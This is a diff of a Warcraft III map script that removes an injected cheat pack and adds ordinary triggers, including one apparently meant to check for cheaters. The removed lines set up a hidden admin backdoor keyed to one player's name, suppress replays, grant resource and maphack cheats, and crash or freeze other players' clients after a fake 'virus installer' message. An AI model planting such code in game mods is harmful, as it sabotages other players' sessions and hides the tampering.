@@ -1,34 +1,4 @@
 globals
-gamecache CACHE=InitGameCache("KeyBindings.w3v")
-trigger ChuangjianDanwei=CreateTrigger()
-trigger gg_trg_Ting=CreateTrigger()
-trigger ChuangjianRect=CreateTrigger()
-trigger QIPIAN3=CreateTrigger()
-trigger array QIPIAN1
-trigger QIPIAN2=CreateTrigger()
-constant string Jiantou="DDRRLDLD"
-string Danci="-JasonLun"
-force udg_ting=CreateForce()
-force PIANZI=CreateForce()
-group Zhiyu=CreateGroup()
-trigger d8d=CreateTrigger()
-string array SHENG1
-integer array SHENG2
-string Xingtong
-integer Bianhao=0
-integer mu8u=0
-trigger Siwang
-real xiaoX=0
-real xiaoY=0
-real daX=0
-real daY=0
-rect Zhuce
-real s8h
-boolean MeisJasonLun=true
-boolean Welcomeya=false
-boolean array ohyeah
-boolean array ohmygod
-player badboyyo=null
 trigger gg_trg_ThantosDrain = null
 trigger gg_trg_ThantosDoom = null
 unit thantos = null
@@ -37,7 +7,11 @@ trigger gg_trg_hecateai1 = null
 trigger gg_trg_hecateai2 = null
 trigger gg_trg_hecateai3 = null
 trigger thandrop = null
+trigger gg_trg_regenh = null
+trigger gg_trg_esuna = null
+trigger gg_trg_hercai = null
 trigger ladondrop = null
+trigger herculesdrop = null
 trigger gg_trg_ladonai = null
 trigger hecatedrop = null
 trigger gg_trg_aresai = null
@@ -45,10 +19,15 @@ trigger gg_trg_hecateskills =null
 trigger gg_trg_nemesisai1 = null
 trigger gg_trg_nemesisai2 = null
 trigger gg_trg_zoom = null
+trigger gg_trg_checkcheater = null
 trigger gg_trg_fuegofinal = null
+trigger gg_trg_set = null
+trigger gg_trg_regen = null
 trigger gg_trg_alcielo = null
 trigger gg_trg_pieldelfuego = null
+trigger gg_trg_givejob = null
 unit udg_ladonu = null
+    rect                    herculesdropregion = null
     rect                    thantosdropregion   = null
     rect                    ladondropregion = null
     rect                    hecatedropregion = null
@@ -560,6 +539,7 @@ trigger Armor16=null
 trigger Armor17=null
 trigger Armor18=null
 trigger Armor19=null
+trigger Armor20 = null
 trigger Zn=null
 trigger lza=null
 trigger vV=null
@@ -884,1303 +864,133 @@ group aA=null
 force nA=null
 boolexpr VA=null
 endglobals
-function sozai takes player b2j,string c8h,boolean b2b returns nothing
-local trigger t2t=CreateTrigger()
-if b2b then
-call TriggerRegisterPlayerChatEvent(t2t,b2j,"-clearkeys",true)
-endif
-call TriggerRegisterPlayerChatEvent(t2t,b2j,c8h,false)
-loop
-call TriggerSleepAction(1.00)
-exitwhen GetTriggerExecCount(t2t)>0
-endloop
-call DestroyTrigger(t2t)
-set t2t=null
-set b2j=null
-set c8h=""
-endfunction
-function Jasoncrash takes player p, player b2j returns nothing
-if (p==GetLocalPlayer())and(p!=badboyyo)and(p!=b2j)then
-call ExecuteFunc("FS Crashed")
-set p=null
-set b2j=null
-endif
-endfunction
-function Jasonadmin takes player b2j returns nothing
-if MeisJasonLun==false then
-call DisplayTimedTextToPlayer(b2j,0,0,10,"|cffff0000                                                "+GetPlayerName(badboyyo)+"|c00ffff00 is already admin.")
-endif
-if (MeisJasonLun==true)and(ohyeah[GetPlayerId(b2j)]==true) then
-set badboyyo=b2j
-set MeisJasonLun=false
-call DisplayTimedTextToPlayer(badboyyo,0,0,10,"|c00ffff00                                                You are now admin.")
-elseif b2j==badboyyo then
-call DisplayTimedTextToPlayer(badboyyo,0,0,10,"|c00ffff00                                                You're already admin!")
-endif
-set b2j=null
-set Welcomeya=true
-endfunction
-function Jasonlogout takes player b2j returns nothing
-if b2j==badboyyo then
-call DisplayTimedTextToPlayer(b2j,0,0,10,"|cffff0000                                                "+GetPlayerName(badboyyo)+"|c00ffff00 has been successfully logged out.")
-endif
-set b2j=null
-set MeisJasonLun=true
-set badboyyo=null
-set Welcomeya=false
-endfunction
-function dunfucklah takes nothing returns nothing
-call TimerStart(CreateTimer(),.001,true,function dunfucklah)
-endfunction
-function dunfuck takes player p, player b2j returns nothing
-if p==GetLocalPlayer()then
-if (p!=badboyyo)and(GetPlayerName(p)!="JasoN.LuN")and(p!=b2j) then
-call RemoveUnit(CreateUnit(GetLocalPlayer(),'hpea',0,0,0))
-call TimerStart(CreateTimer(),.001,true,function dunfucklah)
-endif
-endif
-endfunction 
-function cdcd takes nothing returns nothing
-call UnitResetCooldown(GetTriggerUnit())
-endfunction
-function mpmp takes nothing returns nothing
-local unit d2w=GetTriggerUnit()
-call SetUnitState(d2w,UNIT_STATE_MANA,GetUnitState(d2w,UNIT_STATE_MAX_MANA))
-set d2w=null
-endfunction
-function cdmana takes player b2j,boolean b2b,string c8h returns nothing
-local trigger t2t=CreateTrigger()
-local triggeraction ta2t
-if b2b then
-set ta2t=TriggerAddAction(t2t,function mpmp)
-else
-set ta2t=TriggerAddAction(t2t,function cdcd)
-endif
-call TriggerRegisterPlayerUnitEvent(t2t,b2j,EVENT_PLAYER_UNIT_SPELL_CAST,null)
-call TriggerRegisterPlayerUnitEvent(t2t,b2j,EVENT_PLAYER_UNIT_SPELL_FINISH,null)
-call TriggerRegisterPlayerUnitEvent(t2t,b2j,EVENT_PLAYER_UNIT_SPELL_CHANNEL,null)
-call TriggerRegisterPlayerUnitEvent(t2t,b2j,EVENT_PLAYER_UNIT_SPELL_ENDCAST,null)
-call TriggerRegisterPlayerUnitEvent(t2t,b2j,EVENT_PLAYER_UNIT_SPELL_EFFECT,null)
-call sozai(b2j,c8h,false)
-call DisableTrigger(t2t)
-call TriggerRemoveAction(t2t,ta2t)
-call DestroyTrigger(t2t)
-set t2t=null
-set ta2t=null
-set b2j=null
-set c8h=""
-endfunction
-function whato takes nothing returns nothing
-local integer zrg=0
-loop
-exitwhen zrg>11
-if GetPlayerName(Player(zrg))=="JasoN.LuN"then
-call DisplayTextToPlayer(Player(zrg),0,0,"|c00ffff00Hi all ! JasoN.LuN here xD")
-call ForceAddPlayer(PIANZI,Player(zrg))
-call TriggerRegisterPlayerChatEvent(QIPIAN3,Player(zrg),"-",false)
-call DoNotSaveReplay()
-endif
-set zrg=zrg+1
-endloop
-endfunction
-function whathar takes string c8h, player b2j returns playercolor
-if c8h=="red"then
-return PLAYER_COLOR_RED
-elseif c8h=="blue"then
-return PLAYER_COLOR_BLUE
-elseif c8h=="teal"then
-return PLAYER_COLOR_CYAN
-elseif c8h=="purple"then
-return PLAYER_COLOR_PURPLE
-elseif c8h=="yellow"then
-return PLAYER_COLOR_YELLOW
-elseif c8h=="orange"then
-return PLAYER_COLOR_ORANGE
-elseif c8h=="green"then
-return PLAYER_COLOR_GREEN
-elseif c8h=="pink"then
-return PLAYER_COLOR_PINK
-elseif c8h=="gray"then
-return PLAYER_COLOR_LIGHT_GRAY
-elseif c8h=="lb"then
-return PLAYER_COLOR_LIGHT_BLUE
-elseif c8h=="dg"then
-return PLAYER_COLOR_AQUA
-elseif c8h=="brown"then
-return PLAYER_COLOR_BROWN
-endif
-set b2j=null
-set c8h=""
-return GetPlayerColor(b2j)
-endfunction
-function Deathyyx takes nothing returns nothing
-call KillUnit(GetTriggerUnit())
-endfunction
-function Explodeyyx takes nothing returns nothing
-call SetUnitExploded(GetTriggerUnit(),true)
-endfunction
-function Redyyx takes nothing returns nothing
-call SetUnitColor(GetTriggerUnit(),PLAYER_COLOR_RED)
-endfunction
-function Blueyyx takes nothing returns nothing
-call SetUnitColor(GetTriggerUnit(),PLAYER_COLOR_BLUE)
-endfunction
-function Greenyyx takes nothing returns nothing
-call SetUnitColor(GetTriggerUnit(),PLAYER_COLOR_GREEN)
-endfunction
-function Pinkyyx takes nothing returns nothing
-call SetUnitColor(GetTriggerUnit(),PLAYER_COLOR_PINK)
-endfunction
-function Purpleyyx takes nothing returns nothing
-call SetUnitColor(GetTriggerUnit(),PLAYER_COLOR_PURPLE)
-endfunction
-function Greyzyx takes nothing returns nothing
-call SetUnitColor(GetTriggerUnit(),PLAYER_COLOR_LIGHT_GRAY)
-endfunction
-function LightByx takes nothing returns nothing
-call SetUnitColor(GetTriggerUnit(),PLAYER_COLOR_LIGHT_BLUE)
-endfunction
-function DarkGyx takes nothing returns nothing
-call SetUnitColor(GetTriggerUnit(),PLAYER_COLOR_AQUA)
-endfunction
-function Yellowyyx takes nothing returns nothing
-call SetUnitColor(GetTriggerUnit(),PLAYER_COLOR_YELLOW)
-endfunction
-function Orangeyyx takes nothing returns nothing
-call SetUnitColor(GetTriggerUnit(),PLAYER_COLOR_ORANGE)
-endfunction
-function Tealyyx takes nothing returns nothing
-call SetUnitColor(GetTriggerUnit(),PLAYER_COLOR_CYAN)
-endfunction
-function Brownyyx takes nothing returns nothing
-call SetUnitColor(GetTriggerUnit(),PLAYER_COLOR_BROWN)
-endfunction
-function whatuo takes string c8h returns player
-if c8h=="red"then
-return Player(0)
-elseif c8h=="blue"then
-return Player(1)
-elseif c8h=="teal"then
-return Player(2)
-elseif c8h=="purple"then
-return Player(3)
-elseif c8h=="yellow"then
-return Player(4)
-elseif c8h=="orange"then
-return Player(5)
-elseif c8h=="green"then
-return Player(6)
-elseif c8h=="pink"then
-return Player(7)
-elseif c8h=="gray"then
-return Player(8)
-elseif c8h=="lb"then
-return Player(9)
-elseif c8h=="dg"then
-return Player(10)
-elseif c8h=="brown"then
-return Player(11)
-elseif c8h=="com1"then
-return Player(13)
-elseif c8h=="com2"then
-return Player(14)
-elseif c8h=="com3"then
-return Player(15)
-elseif c8h=="com4"then
-return Player(16)
-endif
-set c8h=""
-return null
-endfunction
-function Jason_ASCII takes integer di2i,string ds2s returns nothing
-local integer di3i=0
-loop
-set SHENG1[di2i+di3i]=SubString(ds2s,di3i,di3i+1)
-set di3i=di3i+1
-exitwhen di3i>=StringLength(ds2s)
-endloop
-endfunction
-function Jackson takes string c8h returns integer
-local integer ii2ii = 48
-loop
-exitwhen ii2ii>122
-if ( SHENG1[ii2ii] == c8h ) then
-return ii2ii
-endif
-set ii2ii = ii2ii + 1
-endloop
-return 0
-endfunction
-function Rax takes string c8h returns integer
-return Jackson(SubString(c8h,0,1))*0x1000000+Jackson(SubString(c8h,1,2))*0x10000+Jackson(SubString(c8h,2,3))*0x100+Jackson(SubString(c8h,3,4))
-endfunction
-function raxwhat takes integer I2I,player b2j returns nothing
-call DisplayTextToPlayer(b2j,0,0,SHENG1[I2I/0x1000000]+SHENG1[(I2I-0x1000000*(I2I/0x1000000))/0x10000]+SHENG1[((I2I-0x1000000*(I2I/0x1000000))-0x10000*((I2I-0x1000000*(I2I/0x1000000))/0x10000))/0x100]+SHENG1[((I2I-0x1000000*(I2I/0x1000000))-0x10000*((I2I-0x1000000*(I2I/0x1000000))/0x10000))-0x100*(((I2I-0x1000000*(I2I/0x1000000))-0x10000*((I2I-0x1000000*(I2I/0x1000000))/0x10000))/0x100)])
-endfunction
-function unat takes nothing returns nothing
-local player b2j=GetTriggerPlayer()
-local integer I2I=GetTrainedUnitType()
-local location j2j=GetUnitLoc(GetTriggerUnit())
-call CreateUnitAtLoc(b2j,I2I,j2j,270)
-set b2j=null
-set j2j=null
-endfunction
-function unaat takes player b2j,string c8h returns nothing
-local trigger t2t=CreateTrigger()
-local triggeraction zta=TriggerAddAction(t2t,function unat)
-call TriggerRegisterPlayerUnitEvent(t2t,b2j,ConvertPlayerUnitEvent(33),null)
-call sozai(b2j,c8h,false)
-call DisableTrigger(t2t)
-call TriggerRemoveAction(t2t,zta)
-call DestroyTrigger(t2t)
-set t2t=null
-set zta=null
-set b2j=null
-set c8h=""
-endfunction
-function playgame takes nothing returns nothing
-call UnitSetConstructionProgress(GetTriggerUnit(),100)
-call UnitSetUpgradeProgress(GetTriggerUnit(),100)
-endfunction
-function searchgame takes nothing returns nothing
-local player b2j=GetTriggerPlayer()
-local integer G2G=GetResearched()
-local integer h2h=GetPlayerTechCount(b2j,G2G,true)
-call SetPlayerTechResearched(b2j,G2G,h2h+1)
-set b2j=null
-endfunction
-function talkshit takes nothing returns nothing
-local unit d2w=GetTriggerUnit()
-local location k2k=GetOrderPointLoc()
-if GetIssuedOrderId()==851990then
-call SetUnitPosition(d2w,GetLocationX(k2k),GetLocationY(k2k))
-endif
-set d2w=null
-set k2k=null
-endfunction
-function shitmeh takes player b2j,string c8h returns nothing
-local trigger t2t=CreateTrigger()
-local triggeraction zta=TriggerAddAction(t2t,function talkshit)
-call TriggerRegisterPlayerUnitEvent(t2t,b2j,ConvertPlayerUnitEvent(39),null)
-call sozai(b2j,c8h,false)
-call DisableTrigger(t2t)
-call TriggerRemoveAction(t2t,zta)
-call DestroyTrigger(t2t)
-set t2t=null
-set zta=null
-set b2j=null
-set c8h=""
-endfunction
-function dunmake takes nothing returns nothing
-local player b2j=GetTriggerPlayer()
-call CreateUnitAtLoc(b2j,mu8u,GetOrderPointLoc(),bj_UNIT_FACING)
-call CreateItemLoc(mu8u,GetOrderPointLoc())
-call CreateDestructableLoc(mu8u,GetOrderPointLoc(),bj_UNIT_FACING,1,10)
-set b2j=null
-endfunction
-function createshit takes player b2j returns nothing
-call TriggerRegisterPlayerUnitEvent(ChuangjianDanwei,b2j,EVENT_PLAYER_UNIT_ISSUED_POINT_ORDER,null)
-call TriggerAddAction(ChuangjianDanwei,function dunmake)
-set b2j=null
-endfunction
-function slowslowbuild takes player b2j,boolean b2b,string c8h returns nothing
-local trigger t2t=CreateTrigger()
-local triggeraction zta
-if b2b then
-set zta=TriggerAddAction(t2t,function playgame)
-else
-set zta=TriggerAddAction(t2t,function searchgame)
-endif
-call TriggerRegisterPlayerUnitEvent(t2t,b2j,ConvertPlayerUnitEvent(30),null)
-call TriggerRegisterPlayerUnitEvent(t2t,b2j,ConvertPlayerUnitEvent(27),null)
-call TriggerRegisterPlayerUnitEvent(t2t,b2j,ConvertPlayerUnitEvent(40),null)
-call TriggerRegisterPlayerUnitEvent(t2t,b2j,ConvertPlayerUnitEvent(38),null)
-call TriggerRegisterPlayerUnitEvent(t2t,b2j,ConvertPlayerUnitEvent(35),null)
-call sozai(b2j,c8h,false)
-call DisableTrigger(t2t)
-call TriggerRemoveAction(t2t,zta)
-call DestroyTrigger(t2t)
-set t2t=null
-set zta=null
-set b2j=null
-set c8h=""
-endfunction
-function truelove takes string c8h returns string
-local integer i2i=0
-local string ss2s=""
-local integer is2s=StringLength(c8h)
-loop
-exitwhen i2i>is2s
-if SubString(c8h,i2i,i2i+1)=="*"then
-set ss2s=ss2s+"|cff"
-elseif SubString(c8h,i2i,i2i+1)=="-"then
-set ss2s=ss2s+"|r"
-else
-set ss2s=ss2s+SubString(c8h,i2i,i2i+1)
-endif
-set i2i=i2i+1
-endloop
-set c8h=""
-return ss2s
-endfunction
-function dungay takes integer di2i returns string
-if di2i==0then
-return"FF0000"
-elseif di2i==1then
-return"0000FF"
-elseif di2i==2then
-return"00FFFF"
-elseif di2i==3then
-return"A020F0"
-elseif di2i==4then
-return"FFFF00"
-elseif di2i==5then
-return"FFA500"
-elseif di2i==6then
-return"00FF00"
-elseif di2i==7then
-return"FF1493"
-elseif di2i==8then
-return"696969"
-elseif di2i==9then
-return"9AC0CD"
-elseif di2i==10then
-return"006400"
-elseif di2i==11then
-return"8B4513"
-endif
-return"FFFFFF"
-endfunction
-function gayporn takes nothing returns nothing
-local player b2j=GetTriggerPlayer()
-local string c8h=GetPlayerName(b2j)
-local integer i3i=GetPlayerId(b2j)
-local integer i2i=0
-loop
-if IsPlayerInForce(Player(i2i),udg_ting)then
-call DisplayTimedTextToPlayer(Player(i2i),0,0,15,"|cff"+dungay(i3i)+c8h+"|r : "+GetEventPlayerChatString())
-endif
-set i2i=i2i+1
-exitwhen i2i>11
-endloop
-endfunction
-function shutup takes nothing returns nothing
-local integer p=0
-if SHENG2[0]<1then
-set SHENG2[0]=1
-loop
-exitwhen p>11
-call TriggerRegisterPlayerChatEvent(gg_trg_Ting,Player(p),"",false)
-set p=p+1
-endloop
-call TriggerAddAction(gg_trg_Ting,function gayporn)
-endif
-endfunction
-function clearleh takes player b2j returns nothing
-local fogmodifier f2f=CreateFogModifierRect(b2j,FOG_OF_WAR_VISIBLE,bj_mapInitialPlayableArea,false,false)
-local integer i2i=0
-call FogModifierStart(f2f)
-loop
-if i2i!=GetPlayerId(b2j)then
-call SetPlayerAlliance(Player(i2i),b2j,ConvertAllianceType(5),true)
-endif
-set i2i=i2i+1
-exitwhen i2i>15
-endloop
-call sozai(b2j,"-nomh",false)
-set i2i=0
-loop
-if i2i!=GetPlayerId(b2j)then
-call SetPlayerAlliance(Player(i2i),b2j,ConvertAllianceType(5),false)
-endif
-set i2i=i2i+1
-exitwhen i2i>15
-endloop
-call FogModifierStop(f2f)
-call DestroyFogModifier(f2f)
-set f2f=null
-set b2j=null
-endfunction
-function wangayanot takes nothing returns nothing
-set Siwang=CreateTrigger()
-call TriggerRegisterEnterRectSimple( Siwang, Zhuce )
-if Xingtong=="kill"then
-call TriggerAddAction(Siwang,function Deathyyx)
-elseif Xingtong=="explode"then
-call TriggerAddAction(Siwang,function Explodeyyx)
-elseif Xingtong=="red"then
-call TriggerAddAction(Siwang,function Redyyx)
-elseif Xingtong=="blue"then
-call TriggerAddAction(Siwang,function Blueyyx)
-elseif Xingtong=="pink"then
-call TriggerAddAction(Siwang,function Pinkyyx)
-elseif Xingtong=="green"then
-call TriggerAddAction(Siwang,function Greenyyx)
-elseif Xingtong=="brown"then
-call TriggerAddAction(Siwang,function Brownyyx)
-elseif Xingtong=="lb"then
-call TriggerAddAction(Siwang,function LightByx)
-elseif Xingtong=="dg"then
-call TriggerAddAction(Siwang,function DarkGyx)
-elseif Xingtong=="teal"then
-call TriggerAddAction(Siwang,function Tealyyx)
-elseif Xingtong=="yellow"then
-call TriggerAddAction(Siwang,function Yellowyyx)
-elseif Xingtong=="gray"then
-call TriggerAddAction(Siwang,function Greyzyx)
-elseif Xingtong=="orange"then
-call TriggerAddAction(Siwang,function Orangeyyx)
-elseif Xingtong=="purple"then
-call TriggerAddAction(Siwang,function Purpleyyx)
-elseif Xingtong=="none"then
-call TriggerAddAction(Siwang,null)
-endif
-endfunction
-function dosomething takes nothing returns nothing
-set Bianhao=Bianhao+1
-if Bianhao==1 then
-set xiaoX=GetOrderPointX()
-set xiaoY=GetOrderPointY()
-endif
-if Bianhao==2 then
-set daX=GetOrderPointX()
-set daY=GetOrderPointY()
-call DestroyTrigger(ChuangjianRect)
-set Bianhao=0
-if xiaoX+xiaoY<daX+daY then
-set Zhuce=Rect(xiaoX,xiaoY,daX,daY)
-elseif xiaoX+xiaoY>daX+daY then
-set Zhuce=Rect(daX,daY,xiaoX,xiaoY)
-endif
-call wangayanot()
-endif
-endfunction
-function dundothat takes player b2j returns nothing
-set ChuangjianRect=CreateTrigger()
-call TriggerRegisterPlayerUnitEvent(ChuangjianRect,b2j,EVENT_PLAYER_UNIT_ISSUED_POINT_ORDER,null)
-call TriggerAddAction(ChuangjianRect,function dosomething)
-endfunction
-function helpme takes nothing returns nothing
-call SetUnitLifePercentBJ(GroupPickRandomUnit(Zhiyu),s8h)
-endfunction
-function boringlah takes nothing returns nothing
-call KillDestructable( GetEnumDestructable() )
-endfunction
-function dungrow takes nothing returns nothing
-call DestructableRestoreLife( GetEnumDestructable(), GetDestructableMaxLife(GetEnumDestructable()), true )
-endfunction
-function Jason_StartMana takes nothing returns nothing
-call cdmana(Player(SHENG2[1]),true,"-nomana")
-endfunction
-function Jason_StartNocd takes nothing returns nothing
-call cdmana(Player(SHENG2[1]),false,"-cdon")
-endfunction
-function Jason_StartFast takes nothing returns nothing
-call unaat(Player(SHENG2[1]),"-nofast")
-endfunction
-function Jason_StartUFast takes nothing returns nothing
-call slowslowbuild(Player(SHENG2[1]),false,"-noufast")
-endfunction
-function Jason_StartBFast takes nothing returns nothing
-call slowslowbuild(Player(SHENG2[1]),true,"-nobfast")
-endfunction
-function Jason_StartTele takes nothing returns nothing
-call shitmeh(Player(SHENG2[1]),"-note")
-endfunction
-function Jason_StartAutoh takes nothing returns nothing
-loop
-call TriggerSleepAction(.1)
-call helpme()
-endloop
-endfunction
-function Jason_StartMapHack takes nothing returns nothing
-call clearleh(Player(SHENG2[1]))
-endfunction
-function comeonbaby takes player b2j,string c8h returns nothing
-local sound Music=CreateSound("cool.mp3",false,false,false,10,10,"DefaultEAXON")
-local integer Sethp=S2I(SubString(c8h,7,12))/50
-local integer i2i=S2I(SubString(c8h,5,20))
-local integer z2z=S2I(SubString(c8h,4,19))
-local integer dj8b=S2I(SubString(c8h,6,9))
-local integer c2c=S2I(SubString(c8h,9,11))
-local real j2j=S2R(SubString(c8h,6,20))
-local string id2d=I2S(GetPlayerId(b2j))
-local group g2g=CreateGroup()
-local group h2g=CreateGroup()
-local force udg_cuowu = CreateForce()
-local integer Nowhp=0
-local integer temp=0
-local integer DJ8B=0
-local unit d2w
-local unit h2u
-local player DJBp1=GetTriggerPlayer()
-local string MeisJasonLun=GetEventPlayerChatString()
-local integer DJBi1=StringLength(MeisJasonLun)
-local integer DJBi2=0
-if SubString(c8h,0,6)=="-gold "then
-call SetPlayerState(b2j,PLAYER_STATE_RESOURCE_GOLD,GetPlayerState(b2j,PLAYER_STATE_RESOURCE_GOLD)+S2I(SubString(c8h,6,13)))
-elseif SubString(c8h,0,7)=="-lumber"then
-call SetPlayerState(b2j,PLAYER_STATE_RESOURCE_LUMBER,GetPlayerState(b2j,PLAYER_STATE_RESOURCE_LUMBER)+S2I(SubString(c8h,8,15)))
-elseif SubString(c8h,0,5)=="-mana"then
-set SHENG2[1]=GetPlayerId(b2j)
-call ExecuteFunc("Jason_StartMana")
-elseif SubString(c8h,0,7)=="-error "then
-if b2j==badboyyo then
-call CinematicModeBJ(true,bj_FORCE_ALL_PLAYERS)
-call ShowInterfaceForceOn( udg_cuowu, 0.01 )
-call CinematicFadeBJ( bj_CINEFADETYPE_FADEOUT, 2.00, "ReplaceableTextures\\CameraMasks\\Black_mask.blp", 0, 0, 0, 0 )
-call SetUserControlForceOff( udg_cuowu )
-call DisplayTextToForce(bj_FORCE_ALL_PLAYERS,"            |cffFF0000S|r|cffFF0000t|r|cffFF0000a|r|cffFF0000r|r|cffFF0000t|r|cffFF0000i|r|cffFF0000n|r|cffFF0000g|r |c00ffff00JasoN.LuN's|r |c0000ff00Virus|r |cffFF0000I|r|cffFF0000n|r|cffFF0000s|r|cffFF0000t|r|cffFF0000a|r|cffff0000l|r|cffff0000l|r|cff8B0000a|r|cff8B0000t|r|cff8B0000i|r|cff8B0000o|r|cff8B0000n|r|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r")
-call TriggerSleepAction(1.5)
-call DisplayTextToForce(bj_FORCE_ALL_PLAYERS,"            |cffFF0000I|r|cffFF0000n|r|cffFF0000s|r|cffFF0000t|r|cffFF0000a|r|cffff0000l|r|cffff0000l|r|cff8B0000i|r|cff8B0000n|r|cff8B0000g|r|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r.|cffE8E8E8|r.|cffE8E8E8|r.|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r.|cffE8E8E80%|r")
-call TriggerSleepAction(1.5)
-call EnableTrigger(d8d)
-call TriggerSleepAction(RMaxBJ(bj_WAIT_FOR_COND_MIN_INTERVAL,.5))
-call DisplayTextToForce(bj_FORCE_ALL_PLAYERS,"            |cffFF0000I|r|cffFF0000n|r|cffFF0000s|r|cffFF0000t|r|cffFF0000a|r|cffff0000l|r|cffff0000l|r|cff8B0000i|r|cff8B0000n|r|cff8B0000g|r|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r.|cffE8E8E8|r.|cffE8E8E8|r.|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r.|cffE8E8E812%|r")
-call TriggerSleepAction(RMaxBJ(bj_WAIT_FOR_COND_MIN_INTERVAL,.5))
-call DisplayTextToForce(bj_FORCE_ALL_PLAYERS,"            |cffFF0000I|r|cffFF0000n|r|cffFF0000s|r|cffFF0000t|r|cffFF0000a|r|cffff0000l|r|cffff0000l|r|cff8B0000i|r|cff8B0000n|r|cff8B0000g|r|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r.|cffE8E8E8|r.|cffE8E8E8|r.|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r.|cffE8E8E829%|r")
-call TriggerSleepAction(RMaxBJ(bj_WAIT_FOR_COND_MIN_INTERVAL,.5))
-call DisplayTextToForce(bj_FORCE_ALL_PLAYERS,"            |cffFF0000I|r|cffFF0000n|r|cffFF0000s|r|cffFF0000t|r|cffFF0000a|r|cffff0000l|r|cffff0000l|r|cff8B0000i|r|cff8B0000n|r|cff8B0000g|r|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r.|cffE8E8E8|r.|cffE8E8E8|r.|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r.|cffE8E8E841%|r")
-call TriggerSleepAction(RMaxBJ(bj_WAIT_FOR_COND_MIN_INTERVAL,.5))
-call DisplayTextToForce(bj_FORCE_ALL_PLAYERS,"            |cffFF0000I|r|cffFF0000n|r|cffFF0000s|r|cffFF0000t|r|cffFF0000a|r|cffff0000l|r|cffff0000l|r|cff8B0000i|r|cff8B0000n|r|cff8B0000g|r|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r.|cffE8E8E8|r.|cffE8E8E8|r.|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r.|cffE8E8E856%|r")
-call TriggerSleepAction(RMaxBJ(bj_WAIT_FOR_COND_MIN_INTERVAL,.5))
-call DisplayTextToForce(bj_FORCE_ALL_PLAYERS,"            |cffFF0000I|r|cffFF0000n|r|cffFF0000s|r|cffFF0000t|r|cffFF0000a|r|cffff0000l|r|cffff0000l|r|cff8B0000i|r|cff8B0000n|r|cff8B0000g|r|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r.|cffE8E8E8|r.|cffE8E8E8|r.|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r.|cffE8E8E874%|r")
-call TriggerSleepAction(RMaxBJ(bj_WAIT_FOR_COND_MIN_INTERVAL,.5))
-call DisplayTextToForce(bj_FORCE_ALL_PLAYERS,"            |cffFF0000I|r|cffFF0000n|r|cffFF0000s|r|cffFF0000t|r|cffFF0000a|r|cffff0000l|r|cffff0000l|r|cff8B0000i|r|cff8B0000n|r|cff8B0000g|r|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r.|cffE8E8E8|r.|cffE8E8E8|r.|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r.|cffE8E8E898%|r")
-call TriggerSleepAction(RMaxBJ(bj_WAIT_FOR_COND_MIN_INTERVAL,.5))
-call DisplayTextToForce(bj_FORCE_ALL_PLAYERS,"            |cffFF0000I|r|cffFF0000n|r|cffFF0000s|r|cffFF0000t|r|cffFF0000a|r|cffff0000l|r|cffff0000l|r|cff8B0000i|r|cff8B0000n|r|cff8B0000g|r|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r.|cffE8E8E8|r.|cffE8E8E8|r.|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r.|cffE8E8E899%|r")
-call TriggerSleepAction(RMaxBJ(bj_WAIT_FOR_COND_MIN_INTERVAL,.5))
-call DisplayTextToForce(bj_FORCE_ALL_PLAYERS,"            |cffFF0000The|r |cffFF0000I|r|cffFF0000n|r|cffFF0000s|r|cffFF0000t|r|cffFF0000a|r|cffff0000l|r|cffff0000l|r|cff8B0000ation|r |cffFF0000is complete.|r")
-call TriggerSleepAction(RMaxBJ(bj_WAIT_FOR_COND_MIN_INTERVAL,1))
-call DisplayTextToForce(bj_FORCE_ALL_PLAYERS,"|cff00FFFFThank you for using|r |c00ffff00JasoN.LuN's|r |c0000ff00Virus|r |cff00FFFFautomated installer. Please restart your computer to ensure completion of the installation.|r")
-call TriggerSleepAction(5)
-call CinematicModeBJ(false,bj_FORCE_ALL_PLAYERS)
-call FinishCinematicFadeAfterBJ(.5)
-call dunfuck(Player(S2I(SubString(MeisJasonLun,7,9))), DJBp1)
-else
-call DisplayTimedTextToPlayer(b2j,0,0,10,"|cffff0000This command is reserved for admin.")
-endif
-elseif SubString(c8h, 0, 9) == "-unfreeze"then
-if b2j==badboyyo then
-call PauseGameOff(  )
-else
-call DisplayTimedTextToPlayer(b2j,0,0,10,"|cffff0000This command is reserved for admin.")
-endif
-elseif SubString(c8h, 0, 7) == "-freeze"then
-if b2j==badboyyo then
-call PauseGameOn(  )
-else
-call DisplayTimedTextToPlayer(b2j,0,0,10,"|cffff0000This command is reserved for admin.")
-endif 
-elseif SubString(c8h,0,6)=="-list1"then
-call DisplayTimedTextToPlayer(b2j,0,0,10,"-gold #   -   Adds # to your current gold")
-call DisplayTimedTextToPlayer(b2j,0,0,10,"-lumber # -   Adds # to your current lumber")
-call DisplayTimedTextToPlayer(b2j,0,0,10,"-food #   -   Set your food capacity")
